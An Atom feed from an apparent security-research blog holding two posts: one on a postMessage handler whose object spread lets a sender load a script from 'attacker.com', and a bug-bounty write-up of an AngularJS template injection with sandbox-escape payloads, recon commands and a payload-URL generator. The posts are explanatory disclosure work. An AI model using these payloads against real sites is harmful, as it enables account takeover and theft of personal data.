<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="scriptsrcscore.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="scriptsrcscore.github.io/" rel="alternate" type="text/html" /><updated>2024-09-02T15:16:55-04:00</updated><id>scriptsrcscore.github.io/feed.xml</id><title type="html">scriptsrc score!</title><subtitle>a repository of my ramblings on topics related to security research and programming.</subtitle><entry><title type="html">Spread syntax and postMessage walk into a bar…</title><link href="scriptsrcscore.github.io/spread-xss" rel="alternate" type="text/html" title="Spread syntax and postMessage walk into a bar…" /><published>2024-09-02T00:00:00-04:00</published><updated>2024-09-02T00:00:00-04:00</updated><id>scriptsrcscore.github.io/1</id><content type="html" xml:base="scriptsrcscore.github.io/spread-xss"><![CDATA[<h1 id="spread-syntax-and-postmessage-walk-into-a-bar">Spread syntax and postMessage walk into a bar…</h1>
<p><br />
I wanted to highlight this bug as I have only seen it mentioned in very few places (linked at the bottom of this post), and thought it was an interesting code pattern to be on the lookout for. Before you continue reading, try to stop and see if there’s anything inherently wrong with the code below. There’s a few mistakes that the developers made that should immediately jump out at you.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">handleScriptConfig</span><span class="p">(</span><span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">const</span> <span class="nx">pathRegex</span> <span class="o">=</span> <span class="sr">/^</span><span class="se">[</span><span class="sr">a-zA-Z0-9</span><span class="se">/</span><span class="sr">.-</span><span class="se">]</span><span class="sr">*$/</span><span class="p">;</span>

  <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">pathRegex</span><span class="p">.</span><span class="nf">test</span><span class="p">(</span><span class="nx">value</span><span class="p">.</span><span class="nx">path</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">pathRegex</span><span class="p">.</span><span class="nf">test</span><span class="p">(</span><span class="nx">value</span><span class="p">.</span><span class="nx">resource</span><span class="p">))</span> <span class="k">return</span><span class="p">;</span>

  <span class="kd">const</span> <span class="nx">scriptConfig</span> <span class="o">=</span> <span class="p">{</span>
    <span class="na">domain</span><span class="p">:</span> <span class="dl">'</span><span class="s1">example-cdn.com</span><span class="dl">'</span><span class="p">,</span>
    <span class="p">...</span><span class="nx">value</span><span class="p">,</span>
  <span class="p">};</span>

  <span class="kd">const</span> <span class="nx">buildScriptSrc</span> <span class="o">=</span> <span class="s2">`https://</span><span class="p">${</span><span class="nx">scriptConfig</span><span class="p">.</span><span class="nx">domain</span> <span class="o">+</span> <span class="nx">scriptConfig</span><span class="p">.</span><span class="nx">path</span> <span class="o">+</span> <span class="nx">scriptConfig</span><span class="p">.</span><span class="nx">resource</span><span class="p">}</span><span class="s2">`</span><span class="p">;</span>

  <span class="kd">const</span> <span class="nx">scriptTag</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">script</span><span class="dl">'</span><span class="p">);</span>
  <span class="nx">scriptTag</span><span class="p">.</span><span class="nf">setAttribute</span><span class="p">(</span><span class="dl">'</span><span class="s1">src</span><span class="dl">'</span><span class="p">,</span> <span class="nx">buildScriptSrc</span><span class="p">);</span>
  <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nf">appendChild</span><span class="p">(</span><span class="nx">scriptTag</span><span class="p">);</span>
<span class="p">}</span>

<span class="nb">window</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">message</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if </span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">path</span> <span class="o">&amp;&amp;</span> <span class="nx">event</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">resource</span><span class="p">)</span> <span class="p">{</span>
    <span class="nf">handleScriptConfig</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">});</span>

</code></pre></div></div>
<p><br />
Did you notice anything? First on the list is the lack of validation done in the message event listener to confirm that the sending origin is trusted, an improved version of this would look like the following:</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">message</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// Validate that the origin of the message is trusted.</span>
  <span class="k">if </span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">origin</span> <span class="o">!==</span> <span class="dl">"</span><span class="s2">https://example.com</span><span class="dl">"</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>

  <span class="k">if </span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">path</span> <span class="o">&amp;&amp;</span> <span class="nx">event</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">resource</span><span class="p">)</span> <span class="p">{</span>
    <span class="nf">handleScriptConfig</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">});</span>
</code></pre></div></div>
<p><br />
Without this check any opening window, or window within the frame hierarchy can send messages containing their own potentially malicious data to the vulnerable page as they please. The interesting part of this code is in the <strong>handleScriptConfig()</strong> function. This function takes two properties from the postMessage object, builds the URL that’s subsequently used in the <strong>src</strong> attribute of a script element, and appends the script to the DOM. At first glance it may be easy to assume that the value for the <strong>domain</strong> property in the <strong>scriptConfig</strong> object is not controllable, but the usage of spread syntax to merge the properties from the postMessage object to scriptConfig undermine this assumption completely.</p>

<p>MDN explains spread syntax in the context of object literals like so:</p>

<blockquote>
  <p>“<em>In an object literal, the spread syntax enumerates the properties of an object and adds the key-value pairs to the object being created.</em>”</p>
</blockquote>

<p>Further, there is one important caveat that comes with using spread syntax in this context:</p>

<blockquote>
  <p>“<em>When one object is spread into another object, or when multiple objects are spread into one object, and properties with identical names are encountered, the property takes the last value assigned while remaining in the position it was originally set.</em>”</p>
</blockquote>

<p>This means that all an attacker would need to do to control the location of the resource that gets embedded in the page is send their own <strong>domain</strong> property in the message. the below object would allow complete control over the script that gets embedded in the document:</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">messageData</span> <span class="o">=</span> <span class="p">{</span>
  <span class="na">path</span><span class="p">:</span> <span class="dl">'</span><span class="s1">/get/rekt/</span><span class="dl">'</span><span class="p">,</span>
  <span class="na">resource</span><span class="p">:</span> <span class="dl">"</span><span class="s2">loser.js</span><span class="dl">"</span><span class="p">,</span>
  <span class="na">domain</span><span class="p">:</span> <span class="dl">'</span><span class="s1">attacker.com</span><span class="dl">'</span>
<span class="p">};</span>
</code></pre></div></div>
<p><br />
<strong>Other posts about spread syntax and its pitfalls:</strong>
https://vccolombo.github.io/cybersecurity/spread-operator-leading-to-xss/
https://vccolombo.github.io/cybersecurity/idor-vulnerability-in-a-personal-project-api/</p>]]></content><author><name></name></author><summary type="html"><![CDATA[Spread syntax and postMessage walk into a bar… I wanted to highlight this bug as I have only seen it mentioned in very few places (linked at the bottom of this post), and thought it was an interesting code pattern to be on the lookout for. Before you continue reading, try to stop and see if there’s anything inherently wrong with the code below. There’s a few mistakes that the developers made that should immediately jump out at you.]]></summary></entry><entry><title type="html">XSS At Scale – Finding and exploiting a program-wide CSTI</title><link href="scriptsrcscore.github.io/xss-at-scale" rel="alternate" type="text/html" title="XSS At Scale – Finding and exploiting a program-wide CSTI" /><published>2024-09-02T00:00:00-04:00</published><updated>2024-09-02T00:00:00-04:00</updated><id>scriptsrcscore.github.io/2</id><content type="html" xml:base="scriptsrcscore.github.io/xss-at-scale"><![CDATA[<h1 id="xss-at-scale--finding-and-exploiting-a-program-wide-csti">XSS At Scale – Finding and exploiting a program-wide CSTI.</h1>
<p><br />
Recently I’ve been re-visiting a program that I’ve previously spent a lot of time on. After finding and reporting a number of vulnerabilities over the course of a few months I still wasn’t completely satisfied with the bugs I had found up to that point, and wanted to dig deeper to uncover some more interesting findings.</p>

<p>In the early stages of testing I had noticed that an alarming amount of their applications were running outdated versions of AngularJS. This is already a red flag considering AngularJS hasn’t been supported for a little under 3 years at the time I’m writing this. The one caveat is that a decent number of these domains were largely unauthenticated static sites with no sensitive actions. The ones that did contain such functionality were interesting as they would give an attacker access to some critical information about a victim (Full Name, Address, Email, Genealogy information, Phoner number, and more.) These domains also included messaging functionality that allows its users to communicate.</p>

<p>With this information in mind the goal was set to find a CSTI in the application as this could surely be used leak a users PII and the messaging functionality can be leveraged to make the XSS wormable, opening up the possibility to scale the vulnerability across the entire user-base.</p>

<p>AngularJS expression syntax is relatively simple, and can be thought of as a JavaScript-like expression (with a few differences that aren’t relevant here) wrapped in two curly brackets:</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{{</span><span class="mi">1</span><span class="o">+</span><span class="mi">1</span><span class="p">}}</span>
</code></pre></div></div>
<p><br />
The main difference that’s important to keep in mind is that AngularJS expressions evaluate within a restricted execution context and each carry their own <strong>scope</strong>. On the other hand, JavaScript expressions evaluate within the global execution context. This means that the global functions and APIs needed to build a working proof of concept won’t be available in the context of an AngularJS expression. However, constructor chaining can be used to gain a reference to window:</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{{</span><span class="kd">constructor</span><span class="p">.</span><span class="nf">constructor</span><span class="p">(</span><span class="dl">'</span><span class="s1">alert</span><span class="dl">'</span><span class="p">)()}}</span>
</code></pre></div></div>
<p><br />
I used the command below to get a list of domains using AngularJS and piped them into gau in the hopes of finding a large number of paths/parameters to test further:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>urls.txt | httpx <span class="nt">-tech-detect</span> <span class="nt">-silent</span> <span class="nt">-no-color</span> | <span class="nb">grep </span>AngularJS | <span class="nb">grep</span> <span class="nt">-oE</span> <span class="s1">'http[s]?://[^ ]+'</span> | gau | <span class="nb">tee</span> <span class="nt">--append</span> urls.txt

</code></pre></div></div>
<p><br />
When testing for template injection the easiest way to confirm that expressions are being evaluated is to supply a basic math expression to any inputs, followed by searching the page for the evaluation. For example, supplying <code class="language-plaintext highlighter-rouge">{{191*7}}</code> in any parameters and searching for the number <strong>1337</strong> within the page.</p>

<p>It wasn’t long before I found a parameter that was evaluating input and reflecting it in an SEO tag in the head of the page. AngularJS uses context-aware encoding by default, but luckily the work-around for this is relatively trivial. By using constructor chaining again within the function body it’s possible to gain a reference to the <strong>String</strong> object in order to use string operations like <strong>fromCharCode</strong>:</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{{</span><span class="kd">constructor</span><span class="p">.</span><span class="nf">constructor</span><span class="p">(</span><span class="nx">valueOf</span><span class="p">.</span><span class="nx">name</span><span class="p">.</span><span class="kd">constructor</span><span class="p">.</span><span class="nf">fromCharCode</span><span class="p">(</span><span class="mi">97</span><span class="p">,</span><span class="mi">108</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">40</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">10</span><span class="p">))()}}</span>

</code></pre></div></div>
<p><br />
The domain I found the first issue in was a static site with almost no dynamic content and no authenticated actions, so I decided to move on and continue looking in other places. It wasn’t long after the first finding that I noticed the same parameter and issue was present in several other domains. With the assumption in mind that these applications were likely using a shared code-base I decided to write a quick google dork in order to get an idea of how many domains have this same issue:</p>
<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">site:*.target.com inurl:parameter=defaultvalue</span>
</code></pre></div></div>
<p><br />
All-in-all I identified that the issue was present in over <strong>60</strong> apps. In 3 of them I was able to leak PII to my origin and in 2 take over a users account with relative ease. In the one with messaging functionality I was able to build a wormable (my first ever!) proof of concept that in an attackers hands would have allowed them to exfiltrate PII at scale. Below you’ll find a quick script I hacked together to generate vulnerable URLs that pop an alert when visited:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="nx">constpayload</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">alert(1)</span><span class="dl">"</span><span class="p">;</span>

<span class="kd">function</span> <span class="nf">buildPayload</span><span class="p">(</span><span class="nx">payloadString</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">let</span> <span class="nx">charArray</span> <span class="o">=</span> <span class="p">[];</span>
  <span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">payloadString</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">charArray</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="nx">payloadString</span><span class="p">.</span><span class="nf">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">));</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="s2">`{{constructor.constructor(valueOf.name.constructor.fromCharCode(</span><span class="p">${</span><span class="nx">charArray</span><span class="p">.</span><span class="nf">toString</span><span class="p">()}</span><span class="s2">))()}}`</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nf">getDomains</span><span class="p">(</span><span class="nx">vulnerableDomains</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">let</span> <span class="nx">linkContainer</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">querySelector</span><span class="p">(</span><span class="dl">'</span><span class="s1">.links</span><span class="dl">'</span><span class="p">);</span>

  <span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">domain</span> <span class="k">of</span> <span class="nx">vulnerableDomains</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">anchor</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">a</span><span class="dl">'</span><span class="p">);</span>
    <span class="kd">let</span> <span class="nx">withExpression</span> <span class="o">=</span> <span class="s2">`</span><span class="p">${</span><span class="nx">domain</span><span class="p">}${</span><span class="nf">buildPayload</span><span class="p">(</span><span class="nx">payload</span><span class="p">)}</span><span class="s2">`</span><span class="p">;</span>

    <span class="nx">anchor</span><span class="p">.</span><span class="nf">setAttribute</span><span class="p">(</span><span class="dl">'</span><span class="s1">href</span><span class="dl">'</span><span class="p">,</span> <span class="nx">withExpression</span><span class="p">);</span>
    <span class="nx">anchor</span><span class="p">.</span><span class="nf">setAttribute</span><span class="p">(</span><span class="dl">'</span><span class="s1">target</span><span class="dl">'</span><span class="p">,</span> <span class="dl">"</span><span class="s2">_blank</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">anchor</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">block</span><span class="dl">'</span><span class="p">;</span>
    <span class="nx">anchor</span><span class="p">.</span><span class="nx">innerText</span> <span class="o">=</span> <span class="nx">withExpression</span><span class="p">;</span>

    <span class="nx">linkContainer</span><span class="p">.</span><span class="nf">appendChild</span><span class="p">(</span><span class="nx">anchor</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="nf">getDomains</span><span class="p">([</span><span class="dl">"</span><span class="s2">https://target.com/test?parameter=</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">https://other.target.com/test?parameter=</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">https://third.target.com/test?parameter=</span><span class="dl">"</span><span class="p">]);</span>

</code></pre></div></div>]]></content><author><name></name></author><summary type="html"><![CDATA[XSS At Scale – Finding and exploiting a program-wide CSTI. Recently I’ve been re-visiting a program that I’ve previously spent a lot of time on. After finding and reporting a number of vulnerabilities over the course of a few months I still wasn’t completely satisfied with the bugs I had found up to that point, and wanted to dig deeper to uncover some more interesting findings. In the early stages of testing I had noticed that an alarming amount of their applications were running outdated versions of AngularJS. This is already a red flag considering AngularJS hasn’t been supported for a little under 3 years at the time I’m writing this. The one caveat is that a decent number of these domains were largely unauthenticated static sites with no sensitive actions. The ones that did contain such functionality were interesting as they would give an attacker access to some critical information about a victim (Full Name, Address, Email, Genealogy information, Phoner number, and more.) These domains also included messaging functionality that allows its users to communicate. With this information in mind the goal was set to find a CSTI in the application as this could surely be used leak a users PII and the messaging functionality can be leveraged to make the XSS wormable, opening up the possibility to scale the vulnerability across the entire user-base. AngularJS expression syntax is relatively simple, and can be thought of as a JavaScript-like expression (with a few differences that aren’t relevant here) wrapped in two curly brackets: {{1+1}} The main difference that’s important to keep in mind is that AngularJS expressions evaluate within a restricted execution context and each carry their own scope. On the other hand, JavaScript expressions evaluate within the global execution context. This means that the global functions and APIs needed to build a working proof of concept won’t be available in the context of an AngularJS expression. However, constructor chaining can be used to gain a reference to window: {{constructor.constructor('alert')()}} I used the command below to get a list of domains using AngularJS and piped them into gau in the hopes of finding a large number of paths/parameters to test further: cat urls.txt | httpx -tech-detect -silent -no-color | grep AngularJS | grep -oE 'http[s]?://[^ ]+' | gau | tee --append urls.txt When testing for template injection the easiest way to confirm that expressions are being evaluated is to supply a basic math expression to any inputs, followed by searching the page for the evaluation. For example, supplying {{191*7}} in any parameters and searching for the number 1337 within the page. It wasn’t long before I found a parameter that was evaluating input and reflecting it in an SEO tag in the head of the page. AngularJS uses context-aware encoding by default, but luckily the work-around for this is relatively trivial. By using constructor chaining again within the function body it’s possible to gain a reference to the String object in order to use string operations like fromCharCode: {{constructor.constructor(valueOf.name.constructor.fromCharCode(97,108,101,114,116,40,49,41,10))()}} The domain I found the first issue in was a static site with almost no dynamic content and no authenticated actions, so I decided to move on and continue looking in other places. It wasn’t long after the first finding that I noticed the same parameter and issue was present in several other domains. With the assumption in mind that these applications were likely using a shared code-base I decided to write a quick google dork in order to get an idea of how many domains have this same issue: site:*.target.com inurl:parameter=defaultvalue All-in-all I identified that the issue was present in over 60 apps. In 3 of them I was able to leak PII to my origin and in 2 take over a users account with relative ease. In the one with messaging functionality I was able to build a wormable (my first ever!) proof of concept that in an attackers hands would have allowed them to exfiltrate PII at scale. Below you’ll find a quick script I hacked together to generate vulnerable URLs that pop an alert when visited: constpayload = "alert(1)"; function buildPayload(payloadString) { let charArray = []; for (let i = 0; i &lt; payloadString.length; i++) { charArray.push(payloadString.charCodeAt(i)); } return `{{constructor.constructor(valueOf.name.constructor.fromCharCode(${charArray.toString()}))()}}`; } function getDomains(vulnerableDomains) { let linkContainer = document.querySelector('.links'); for (let domain of vulnerableDomains) { let anchor = document.createElement('a'); let withExpression = `${domain}${buildPayload(payload)}`; anchor.setAttribute('href', withExpression); anchor.setAttribute('target', "_blank"); anchor.style.display = 'block'; anchor.innerText = withExpression; linkContainer.appendChild(anchor); } } getDomains(["https://target.com/test?parameter=", "https://other.target.com/test?parameter=", "https://third.target.com/test?parameter="]);]]></summary></entry></feed>